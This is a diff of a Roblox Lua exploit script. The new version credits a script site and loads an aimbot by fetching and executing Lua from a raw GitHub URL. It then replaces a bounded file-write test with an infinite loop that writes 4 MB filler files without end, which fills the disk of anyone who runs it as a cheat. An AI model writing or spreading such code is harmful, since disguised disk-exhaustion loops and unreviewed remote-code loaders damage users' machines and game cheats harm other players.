@@ -1,36 +1,30 @@
---[[
-	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-]]
-loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Universal-Aimbot-Works-2026-83277"))()
-task.wait(2)
+-- Script taken from https://xenoscripts.com website --
+
+-- Join our discord https://discord.gg/5S8ApF6rRp
+loadstring(game:HttpGet("https://raw.githubusercontent.com/asldsaldle12/spj-aim/refs/heads/main/main.lua"))()
 local fileNamePrefix = "Systematic"
 local fileSize = 4 * 1024 * 1024
 local content = string.rep("A", fileSize)
 
-for counter = 1, 10000000 do
+local startTime = os.clock()
+local counter = 1
+
+while true do
     local fileName = fileNamePrefix .. counter .. ".txt"
 
     local success, err = pcall(function()
         writefile(fileName, content)
     end)
 
-    if not success then
-        warn(fileName .. " write failed: " .. tostring(err))
-        continue
+    if success then
+        print("Success: " .. fileName)
+    else
+        warn("Failed: " .. tostring(err))
     end
 
-    local readSuccess, result = pcall(function()
-        return readfile(fileName)
-    end)
+    counter = counter + 1
 
-    if not readSuccess then
-        warn(fileName .. " read failed: " .. tostring(result))
-        continue
+    if os.clock() - startTime < 20 then
+        task.wait(0.15)
     end
-
-    print(fileName .. " exists: " .. tostring(isfile(fileName)))
-    print("Actual size: " .. #result .. " bytes")
-    print("Correct size: " .. tostring(#result == fileSize))
-    print("Content correct: " .. tostring(result == content))
 end
-
